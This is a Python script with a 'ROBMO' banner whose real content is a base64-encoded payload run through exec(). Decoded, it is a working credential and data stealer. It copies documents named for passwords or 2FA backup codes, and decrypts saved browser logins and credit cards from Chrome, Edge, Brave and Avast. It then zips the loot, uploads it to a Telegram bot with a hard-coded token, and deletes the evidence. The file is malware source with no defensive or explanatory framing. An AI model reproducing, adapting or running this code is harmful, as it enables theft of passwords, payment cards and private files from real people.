import os, random, time, sqlite3, shutil, requests
import zipfile, json, psutil, base64, getpass
import subprocess, xml.etree.ElementTree as ET
import winreg as reg, threading, asyncio, ctypes

from Crypto.Cipher import AES
from ctypes import wintypes
from ctypes.wintypes import BOOL, DWORD, LPVOID, LPCWSTR
from urllib.request import urlopen, Request
from json import loads as json_loads, load
from datetime import datetime
from datetime import datetime, timedelta
from json import loads
from pathlib import Path
from telebot import TeleBot, types

i = '''
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó

   ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñë‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñë‚ñà‚ñà‚ñà‚ïó‚ñë‚ñë‚ñë‚ñà‚ñà‚ñà‚ïó‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñë
   ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ïó‚ñë‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó
   ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë‚ñë‚ñë‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ï¶‚ïù‚ñà‚ñà‚ïî‚ñà‚ñà‚ñà‚ñà‚ïî‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ñë‚ñë‚ñà‚ñà‚ïë
   ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ñë‚ñë‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ñë‚ñë‚ñà‚ñà‚ïë
   ‚ñà‚ñà‚ïë‚ñë‚ñë‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ï¶‚ïù‚ñà‚ñà‚ïë‚ñë‚ïö‚ïê‚ïù‚ñë‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù
   ‚ïö‚ïê‚ïù‚ñë‚ñë‚ïö‚ïê‚ïù‚ñë‚ïö‚ïê‚ïê‚ïê‚ïê‚ïù‚ñë‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ñë‚ïö‚ïê‚ïù‚ñë‚ñë‚ñë‚ñë‚ñë‚ïö‚ïê‚ïù‚ñë‚ïö‚ïê‚ïê‚ïê‚ïê‚ïù‚ñë
   
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
'''

r = '''
‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê ùêïùêíùêóùêó - ùêÅùêò: @ùêëùüéùêÅùêåùüé ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
'''

exec(base64.b64decode('dXNlciA9IG9zLnBhdGguZXhwYW5kdXNlcigifiIpCnVzZXJuYW1lID0gb3MuZ2V0ZW52KCJVU0VSTkFNRSIpCnVzZXJfbmFtZSA9IG9zLmdldGxvZ2luKCkKCkJPVF9UT0tFTiA9ICI2NjUwNTA1MjQyOkFBRzVwMWRLZ0V0V1JHOHVMT2pPbnptYmc4aTZDRDBOTG9VIgpDSEFUX0lEID0gLTEwMDE5MzMxMDI3ODAKVVNFUl9UTEdfSUQgPSAxOTcyNTA1MjkzCgpsb2NhbCA9IG9zLmdldGVudignTE9DQUxBUFBEQVRBJykKcm9hbWluZyA9IG9zLmdldGVudignQVBQREFUQScpCnVfZm9sZGVyID0gb3MucGF0aC5qb2luKG9zLnBhdGguZXhwYW5kdXNlcigifiIpLCAiR29vZ2xlIikKCmFycm93ID0gIiDinqQgIgpzID0gIlxuIgoKZGVmIGNyZWF0ZV9mb2xkZXIoZm9sZGVyX3BhdGgpOgogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKGZvbGRlcl9wYXRoKToKICAgICAgICBvcy5tYWtlZGlycyhmb2xkZXJfcGF0aCwgZXhpc3Rfb2s9VHJ1ZSkKCmNyZWF0ZV9mb2xkZXIodV9mb2xkZXIpCgpkZWYgc2hvd19maWxlcygpOgogICAgdHJ5OgogICAgICAgIHJlZ2lzdHJ5X3BhdGggPSByIlNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXEV4cGxvcmVyXEFkdmFuY2VkIgogICAgICAgIGtleV9uYW1lID0gIkhpZGRlbiIKCiAgICAgICAgd2l0aCByZWcuT3BlbktleShyZWcuSEtFWV9DVVJSRU5UX1VTRVIsIHJlZ2lzdHJ5X3BhdGgsIDAsIHJlZy5LRVlfU0VUX1ZBTFVFKSBhcyBrZXk6CiAgICAgICAgICAgIHJlZy5TZXRWYWx1ZUV4KGtleSwga2V5X25hbWUsIDAsIHJlZy5SRUdfRFdPUkQsIDEpCgogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHBhc3MKICAgIApzaG93X2ZpbGVzKCkKCmZvbGRlcnMgPSBbICAgIAogICAgb3MucGF0aC5qb2luKHVzZXIsICJEb3dubG9hZHMiKSwgCiAgICBvcy5wYXRoLmpvaW4odXNlciwgIk9uZURyaXZlIiwgIkRvY3VtZW50cyIpLAogICAgb3MucGF0aC5qb2luKHVzZXIsICJEb2N1bWVudHMiKSwgCiAgICBvcy5wYXRoLmpvaW4odXNlciwgIk9uZURyaXZlIiwgIkRvY3VtZW50b3MiKSwKICAgIG9zLnBhdGguam9pbih1c2VyLCAiRG9jdW1lbnRvcyIpLCAKICAgIG9zLnBhdGguam9pbih1c2VyLCAiT25lRHJpdmUiLCAiRXNjcml0b3JpbyIpLAogICAgb3MucGF0aC5qb2luKHVzZXIsICJPbmVEcml2ZSIsICJEZXNrdG9wIiksCiAgICBvcy5wYXRoLmpvaW4odXNlciwgIkRlc2t0b3AiKSwKICAgIG9zLnBhdGguam9pbih1c2VyLCAiRXNjcml0b3JpbyIpLApdCgpmaWxlX3NlYXJjaCA9IHsiMmZhIiwgImJhY2t1cCIsICJ0d28iLCAiZmFjdG9yIiwgImNvZGVzIiwgImNvZGUiLCAicGFzc3dvcmRzIn0KZXh0ZW5zaW9ucyA9ICgnLmRvY3gnLCAnLnhsc3gnLCAnLnBwdHgnLCAnLnBkZicsICcuY3N2JykKCmRlZiBzZWFyY2hfZmlsZXMoZmlsZW5hbWUpOgogICAgZmlsZW5hbWVfbG93ZXIgPSBmaWxlbmFtZS5sb3dlcigpCiAgICByZXR1cm4gYW55KGtleXdvcmQgaW4gZmlsZW5hbWVfbG93ZXIgZm9yIGtleXdvcmQgaW4gZmlsZV9zZWFyY2gpCgpmb3IgZm9sZGVyIGluIGZvbGRlcnM6CiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoZm9sZGVyKToKICAgICAgICBjb250aW51ZQogICAgCiAgICBmb3Igcm9vdCwgZGlycywgZmlsZXMgaW4gb3Mud2Fsayhmb2xkZXIpOgogICAgICAgIGZvciBmaWxlIGluIGZpbGVzOgogICAgICAgICAgICBmaWxlX3BhdGggPSBvcy5wYXRoLmpvaW4ocm9vdCwgZmlsZSkKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIGZpbGUubG93ZXIoKS5lbmRzd2l0aCgnLnR4dCcpIGFuZCBzZWFyY2hfZmlsZXMoZmlsZSk6CiAgICAgICAgICAgICAgICBzaHV0aWwuY29weShmaWxlX3BhdGgsIHVfZm9sZGVyKQogICAgICAgICAgICBlbGlmIGZpbGUubG93ZXIoKS5lbmRzd2l0aChleHRlbnNpb25zKToKICAgICAgICAgICAgICAgIHNodXRpbC5jb3B5KGZpbGVfcGF0aCwgdV9mb2xkZXIpCgpicm93c2VycyA9IHsKICAgICdBdmFzdCc6IGxvY2FsICsgJ1xcQVZBU1RcXFNvZnR3YXJlIEJyb3dzZXJcXFVzZXIgRGF0YScsICAKICAgICdDaHJvbWUnOiBsb2NhbCArICdcXEdvb2dsZVxcQ2hyb21lXFxVc2VyIERhdGEnLAogICAgJ0VkZ2UnOiBsb2NhbCArICdcXE1pY3Jvc29mdFxcRWRnZVxcVXNlciBEYXRhJywKICAgICdCcmF2ZSc6IGxvY2FsICsgJ1xcQnJhdmVTb2Z0d2FyZVxcQnJhdmUtQnJvd3NlclxcVXNlciBEYXRhJywKfQoKZGF0YV9xdWVyaWVzID0gewogICAgJ1Bhc3N3b3Jkcyc6IHsKICAgICAgICAncXVlcnknOiAnU0VMRUNUIG9yaWdpbl91cmwsIHVzZXJuYW1lX3ZhbHVlLCBwYXNzd29yZF92YWx1ZSBGUk9NIGxvZ2lucycsCiAgICAgICAgJ2ZpbGUnOiAnXFxMb2dpbiBEYXRhJywKICAgICAgICAnY29sdW1ucyc6IFsnVVJMJywgJ1VzZXInLCAnUGFzc3dvcmQnXSwKICAgICAgICAnZGVjcnlwdCc6IFRydWUKICAgIH0sCiAgICAnQ3JlZGl0IENhcmRzJzogewogICAgICAgICdxdWVyeSc6ICdTRUxFQ1QgbmFtZV9vbl9jYXJkLCBleHBpcmF0aW9uX21vbnRoLCBleHBpcmF0aW9uX3llYXIsIGNhcmRfbnVtYmVyX2VuY3J5cHRlZCwgZGF0ZV9tb2RpZmllZCBGUk9NIGNyZWRpdF9jYXJkcycsCiAgICAgICAgJ2ZpbGUnOiAnXFxXZWIgRGF0YScsCiAgICAgICAgJ2NvbHVtbnMnOiBbJ05hbWUnLCAnTW9udGgnLCAnWWVhcicsICdDYXJkIE51bWJlciddLAogICAgICAgICdkZWNyeXB0JzogVHJ1ZQogICAgfSwKICAgICdIaXN0b3J5JzogewogICAgICAgICdxdWVyeSc6ICdTRUxFQ1QgdXJsLCB0aXRsZSBGUk9NIHVybHMnLAogICAgICAgICdmaWxlJzogJ1xcSGlzdG9yeScsCiAgICAgICAgJ2NvbHVtbnMnOiBbJ1VSTCcsICdUaXRsZSddLAogICAgICAgICdkZWNyeXB0JzogRmFsc2UKICAgIH0sCiAgICAnRG93bmxvYWRzJzogewogICAgICAgICdxdWVyeSc6ICdTRUxFQ1QgdGFiX3VybCwgdGFyZ2V0X3BhdGggRlJPTSBkb3dubG9hZHMnLAogICAgICAgICdmaWxlJzogJ1xcSGlzdG9yeScsCiAgICAgICAgJ2NvbHVtbnMnOiBbJ1VSbCcsICdQYXRoJ10sCiAgICAgICAgJ2RlY3J5cHQnOiBGYWxzZQogICAgfSwKfQoKY3J5cHQzMiA9IGN0eXBlcy53aW5kbGwuY3J5cHQzMgoKY2xhc3MgREFUQV9CTE9CKGN0eXBlcy5TdHJ1Y3R1cmUpOgogICAgX2ZpZWxkc18gPSBbKCJjYkRhdGEiLCB3aW50eXBlcy5EV09SRCksCiAgICAgICAgICAgICAgICAoInBiRGF0YSIsIGN0eXBlcy5QT0lOVEVSKGN0eXBlcy5jX2J5dGUpKV0KCmNyeXB0MzIuQ3J5cHRVbnByb3RlY3REYXRhLmFyZ3R5cGVzID0gW2N0eXBlcy5QT0lOVEVSKERBVEFfQkxPQiksIGN0eXBlcy5QT0lOVEVSKHdpbnR5cGVzLkxQV1NUUiksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGN0eXBlcy5QT0lOVEVSKERBVEFfQkxPQiksIGN0eXBlcy5jX3ZvaWRfcCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY3R5cGVzLmNfdm9pZF9wLCB3aW50eXBlcy5EV09SRCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY3R5cGVzLlBPSU5URVIoREFUQV9CTE9CKV0KY3J5cHQzMi5DcnlwdFVucHJvdGVjdERhdGEucmVzdHlwZSA9IHdpbnR5cGVzLkJPT0wKCmRlZiBkYXRhX3RvX2Jsb2IoZGF0YSk6CiAgICBibG9iID0gREFUQV9CTE9CKCkKICAgIGJsb2IuY2JEYXRhID0gbGVuKGRhdGEpCiAgICBibG9iLnBiRGF0YSA9IGN0eXBlcy5jYXN0KGN0eXBlcy5jcmVhdGVfc3RyaW5nX2J1ZmZlcihkYXRhKSwgY3R5cGVzLlBPSU5URVIoY3R5cGVzLmNfYnl0ZSkpCiAgICByZXR1cm4gYmxvYgoKZGVmIENyeXB0VW5wcm90ZWN0RGF0YShkYXRhLCBlbnRyb3B5LCByZXNlcnZlZCwgcHJvbXB0LCBmbGFncyk6CiAgICBpbl9kYXRhID0gZGF0YV90b19ibG9iKGRhdGEpCiAgICBvdXRfZGF0YSA9IERBVEFfQkxPQigpCiAgICBkZXNjcmlwdGlvbiA9IHdpbnR5cGVzLkxQV1NUUigpCiAgICAKICAgIHJlc3VsdCA9IGNyeXB0MzIuQ3J5cHRVbnByb3RlY3REYXRhKAogICAgICAgIGN0eXBlcy5ieXJlZihpbl9kYXRhKSwKICAgICAgICBjdHlwZXMuYnlyZWYoZGVzY3JpcHRpb24pLAogICAgICAgIGVudHJvcHksCiAgICAgICAgcmVzZXJ2ZWQsCiAgICAgICAgcHJvbXB0LAogICAgICAgIGZsYWdzLAogICAgICAgIGN0eXBlcy5ieXJlZihvdXRfZGF0YSkKICAgICkKICAgIAogICAgaWYgbm90IHJlc3VsdDoKICAgICAgICByYWlzZSBjdHlwZXMuV2luRXJyb3IoKQogICAgCiAgICBkZWNyeXB0ZWRfZGF0YSA9IGN0eXBlcy5zdHJpbmdfYXQob3V0X2RhdGEucGJEYXRhLCBvdXRfZGF0YS5jYkRhdGEpCiAgICByZXR1cm4gZGVzY3JpcHRpb24udmFsdWUsIGRlY3J5cHRlZF9kYXRhCgpkZWYgZ2V0X21hc3Rlcl9rZXkocGF0aDogc3RyKToKICAgIHRyeToKICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aCk6CiAgICAgICAgICAgIHJldHVybgoKICAgICAgICBpZiAnb3NfY3J5cHQnIG5vdCBpbiBvcGVuKHBhdGggKyAiXFxMb2NhbCBTdGF0ZSIsICdyJywgZW5jb2Rpbmc9J3V0Zi04JykucmVhZCgpOgogICAgICAgICAgICByZXR1cm4KCiAgICAgICAgd2l0aCBvcGVuKHBhdGggKyAiXFxMb2NhbCBTdGF0ZSIsICJyIiwgZW5jb2Rpbmc9InV0Zi04IikgYXMgZjoKICAgICAgICAgICAgYyA9IGYucmVhZCgpCiAgICAgICAgbG9jYWxfc3RhdGUgPSBqc29uLmxvYWRzKGMpCgogICAgICAgIGtleSA9IGJhc2U2NC5iNjRkZWNvZGUobG9jYWxfc3RhdGVbIm9zX2NyeXB0Il1bImVuY3J5cHRlZF9rZXkiXSkKICAgICAgICBrZXkgPSBrZXlbNTpdCiAgICAgICAga2V5ID0gQ3J5cHRVbnByb3RlY3REYXRhKGtleSwgTm9uZSwgTm9uZSwgTm9uZSwgMClbMV0KICAgICAgICByZXR1cm4ga2V5CiAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgIHJldHVybiBOb25lCgpkZWYgZGVjcnlwdF9wYXNzd29yZChidWZmOiBieXRlcywga2V5OiBieXRlcykgLT4gc3RyOgogICAgaXYgPSBidWZmWzM6MTVdCiAgICBwYXlsb2FkID0gYnVmZlsxNTpdCiAgICBjaXBoZXIgPSBBRVMubmV3KGtleSwgQUVTLk1PREVfR0NNLCBpdikKICAgIGRlY3J5cHRlZF9wYXNzID0gY2lwaGVyLmRlY3J5cHQocGF5bG9hZCkKICAgIGRlY3J5cHRlZF9wYXNzID0gZGVjcnlwdGVkX3Bhc3NbOi0xNl0uZGVjb2RlKCkKCiAgICByZXR1cm4gZGVjcnlwdGVkX3Bhc3MKCmRlZiBzYXZlX3Jlc3VsdHMoYnJvd3Nlcl9uYW1lLCB0eXBlX29mX2RhdGEsIGNvbnRlbnQpOgogICAgYnJvd3NlciA9IG9zLnBhdGguam9pbih1X2ZvbGRlciwgIkJyb3dzZXJzIiwgYnJvd3Nlcl9uYW1lKQogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKGJyb3dzZXIpOgogICAgICAgIG9zLm1ha2VkaXJzKGJyb3dzZXIsIGV4aXN0X29rPVRydWUpCiAgICAKICAgIGlmIGNvbnRlbnQgaXMgbm90IE5vbmU6CiAgICAgICAgZmlsZV9wYXRoID0gb3MucGF0aC5qb2luKGJyb3dzZXIsIGYie3R5cGVfb2ZfZGF0YX0udHh0IikKICAgICAgICB3aXRoIG9wZW4oZmlsZV9wYXRoLCAndycsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGZpbGU6CiAgICAgICAgICAgIGZpbGUud3JpdGUoaS5zdHJpcCgpICsgIlxuXG4iICsgY29udGVudCkKCmRlZiBnZXRfZGF0YShwYXRoOiBzdHIsIHByb2ZpbGU6IHN0ciwga2V5LCB0eXBlX29mX2RhdGEpOgogICAgdHJ5OgogICAgICAgIGRiX2ZpbGUgPSBmJ3twYXRofVxce3Byb2ZpbGV9e3R5cGVfb2ZfZGF0YVsiZmlsZSJdfScKICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoZGJfZmlsZSk6CiAgICAgICAgICAgIHJldHVybgogICAgICAgIHJlc3VsdCA9ICIiCiAgICAgICAgc2h1dGlsLmNvcHkoZGJfZmlsZSwgJ3RlbXBfZGInKQogICAgICAgIGNvbm4gPSBzcWxpdGUzLmNvbm5lY3QoJ3RlbXBfZGInKQogICAgICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkKICAgICAgICBjdXJzb3IuZXhlY3V0ZSh0eXBlX29mX2RhdGFbJ3F1ZXJ5J10pCiAgICAgICAgZm9yIHJvdyBpbiBjdXJzb3IuZmV0Y2hhbGwoKToKICAgICAgICAgICAgcm93ID0gbGlzdChyb3cpCiAgICAgICAgICAgIGlmIHR5cGVfb2ZfZGF0YVsnZGVjcnlwdCddOgogICAgICAgICAgICAgICAgZm9yIGkgaW4gcmFuZ2UobGVuKHJvdykpOgogICAgICAgICAgICAgICAgICAgIGlmIGlzaW5zdGFuY2Uocm93W2ldLCBieXRlcyk6CiAgICAgICAgICAgICAgICAgICAgICAgIHJvd1tpXSA9IGRlY3J5cHRfcGFzc3dvcmQocm93W2ldLCBrZXkpCiAgICAgICAgICAgIGlmIGRhdGFfdHlwZV9uYW1lID09ICdoaXN0b3J5JzoKICAgICAgICAgICAgICAgIGlmIHJvd1syXSAhPSAwOgogICAgICAgICAgICAgICAgICAgIHJvd1syXSA9IGNvbnZlcnRfY2hyb21lX3RpbWUocm93WzJdKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICByb3dbMl0gPSAiMCIKICAgICAgICAgICAgcmVzdWx0ICs9ICJcbiIuam9pbihbZiJ7Y29sfToge3ZhbH0iIGZvciBjb2wsIHZhbCBpbiB6aXAodHlwZV9vZl9kYXRhWydjb2x1bW5zJ10sIHJvdyldKSArICJcblxuIgogICAgICAgIGNvbm4uY2xvc2UoKQogICAgICAgIG9zLnJlbW92ZSgndGVtcF9kYicpCiAgICAgICAgcmV0dXJuIHJlc3VsdAogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICByZXR1cm4gTm9uZQoKZGVmIGNvbnZlcnRfY2hyb21lX3RpbWUoY2hyb21lX3RpbWUpOgogICAgcmV0dXJuIChkYXRldGltZSgxNjAxLCAxLCAxKSArIHRpbWVkZWx0YShtaWNyb3NlY29uZHM9Y2hyb21lX3RpbWUpKS5zdHJmdGltZSgnJWQvJW0vJVkgJUg6JU06JVMnKQoKZGVmIGluc3RhbGxlZF9icm93c2VycygpOgogICAgYXZhaWxhYmxlID0gW10KICAgIGZvciB4IGluIGJyb3dzZXJzLmtleXMoKToKICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhicm93c2Vyc1t4XSk6CiAgICAgICAgICAgIGF2YWlsYWJsZS5hcHBlbmQoeCkKICAgIHJldHVybiBhdmFpbGFibGUKCmF2YWlsYWJsZV9icm93c2VycyA9IGluc3RhbGxlZF9icm93c2VycygpCgpmb3IgYnJvd3NlciBpbiBhdmFpbGFibGVfYnJvd3NlcnM6CiAgICBicm93c2VyX3BhdGggPSBicm93c2Vyc1ticm93c2VyXQogICAgbWFzdGVyX2tleSA9IGdldF9tYXN0ZXJfa2V5KGJyb3dzZXJfcGF0aCkKCiAgICBmb3IgZGF0YV90eXBlX25hbWUsIGRhdGFfdHlwZSBpbiBkYXRhX3F1ZXJpZXMuaXRlbXMoKToKICAgICAgICBkYXRhID0gZ2V0X2RhdGEoYnJvd3Nlcl9wYXRoLCAiRGVmYXVsdCIsIG1hc3Rlcl9rZXksIGRhdGFfdHlwZSkKICAgICAgICBzYXZlX3Jlc3VsdHMoYnJvd3NlciwgZGF0YV90eXBlX25hbWUsIGRhdGEpCgphc3luYyBkZWYgY3JlYXRlX3ppcCh1X2ZvbGRlcik6CiAgICB1c2VyID0gb3MuZ2V0bG9naW4oKQoKICAgIG5vdyA9IGRhdGV0aW1lLm5vdygpCiAgICB6aXBfZmlsZW5hbWUgPSBmIlJPQk1PW3t1c2VyfV1be25vdy5kYXk6MDJkfXtub3cubW9udGg6MDJkfXtub3cuaG91cjowMmR9e25vdy5zZWNvbmQ6MDJkfV0uemlwIgoKICAgIHppcF9maWxlcGF0aCA9IG9zLnBhdGguam9pbigiQzpcXFVzZXJzIiwgdXNlciwgIkRvd25sb2FkcyIsIHppcF9maWxlbmFtZSkKCiAgICB0cnk6CiAgICAgICAgc2h1dGlsLm1ha2VfYXJjaGl2ZSh6aXBfZmlsZXBhdGhbOi00XSwgJ3ppcCcsIHVfZm9sZGVyKQogICAgICAgIHJldHVybiB6aXBfZmlsZXBhdGgKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwYXNzCiAgICAgICAgcmV0dXJuIE5vbmUgICAgCiAgICAKYXN5bmMgZGVmIHNlbmRfemlwX3RvX3RlbGVncmFtKHppcF9maWxlcGF0aCwgYm90X3Rva2VuLCBjaGF0X2lkKToKICAgIGJvdCA9IFRlbGVCb3QoYm90X3Rva2VuKQoKICAgIHRyeToKICAgICAgICB1c2VyX21lc3NhZ2UgPSBmIlVzZXI6IHt1c2VyX25hbWV9IgogICAgICAgIAogICAgICAgIGJvdC5zZW5kX21lc3NhZ2UoY2hhdF9pZCwgdXNlcl9tZXNzYWdlKQoKICAgICAgICB3aXRoIG9wZW4oemlwX2ZpbGVwYXRoLCAncmInKSBhcyB6aXBfZmlsZToKICAgICAgICAgICAgYm90LnNlbmRfZG9jdW1lbnQoY2hhdF9pZCwgemlwX2ZpbGUpCgogICAgICAgIHNlcGFyYXRvcl9tZXNzYWdlID0gIuKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkCIKICAgICAgICBib3Quc2VuZF9tZXNzYWdlKGNoYXRfaWQsIHNlcGFyYXRvcl9tZXNzYWdlKQoKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwYXNzCgphc3luYyBkZWYgbWFpbigpOgogICAgemlwX2ZpbGVwYXRoID0gYXdhaXQgY3JlYXRlX3ppcCh1X2ZvbGRlcikKICAgIGlmIHppcF9maWxlcGF0aDoKICAgICAgICBhd2FpdCBzZW5kX3ppcF90b190ZWxlZ3JhbSh6aXBfZmlsZXBhdGgsIEJPVF9UT0tFTiwgQ0hBVF9JRCkKICAgICAgICBhd2FpdCBzZW5kX3ppcF90b190ZWxlZ3JhbSh6aXBfZmlsZXBhdGgsIEJPVF9UT0tFTiwgVVNFUl9UTEdfSUQpCiAgICAgICAgb3MucmVtb3ZlKHppcF9maWxlcGF0aCkKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICBhc3luY2lvLnJ1bihtYWluKCkpCgpkZWYgZGVsZXRlKCk6CiAgICB0cnk6CiAgICAgICAgc2h1dGlsLnJtdHJlZSh1X2ZvbGRlcikKICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoKICAgICAgICBwYXNzCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcGFzcwpkZWxldGUoKQ==').decode('utf-8'))
